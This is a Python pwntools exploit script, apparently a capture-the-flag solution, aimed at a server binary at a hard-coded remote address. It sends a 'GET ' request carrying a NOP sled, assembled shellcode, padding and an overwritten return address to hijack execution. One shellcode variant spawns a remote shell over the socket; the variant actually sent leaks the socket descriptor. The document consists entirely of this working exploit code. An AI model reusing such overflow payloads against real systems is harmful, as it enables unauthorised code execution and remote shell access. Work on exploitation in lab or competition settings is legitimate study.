from pwn import *

context(arch='amd64', os='linux', log_level='debug')

e = ELF('server.out')

r = remote('34.82.101.212', 8001)
#  r = remote('localhost', 8888)

#  r.send(b'GET ' + b'a'*(0x9800-0x9418+4) + p64(0xdeafbeef))

sockfd = 0x600b24
dputi = 0x4001a3
dputs = 0x400206

#  code = [
#      # dup2(socket, 0)
#      'mov rax, 0x600b24',
#      'mov rdi, qword ptr [rax]',
#      'xor rsi, rsi',
#      'mov rax, 0x21',
#      'syscall',

#      # dup2(socket, 1)
#      'mov rax, 0x600b24',
#      'mov rdi, qword ptr [rax]',
#      'mov rsi, 1',
#      'mov rax, 0x21',
#      'syscall'
#  ]
#  code = '\n'.join(code)

code = ''
code += shellcraft.dup2(4, 0)
code += shellcraft.dup2(4, 1)
code += shellcraft.sh()

#  dputi(sockfd)
code = ''
code += shellcraft.mov('rax', sockfd-8)
code += 'mov rdi, qword [rax]\n'
code += shellcraft.mov('rsi', 'rdi')
code += shellcraft.mov('rax', dputi)
code += 'call rax\n'
code += shellcraft.exit(0)


print(code)
shellcode = asm(code)

padding = b'\x90' * 10

ret_addr = 0x600a95
r.send(b'GET ' + padding + shellcode +
        b'a'*(0x3ec - len(padding) - len(shellcode)) + p64(ret_addr))

r.interactive()

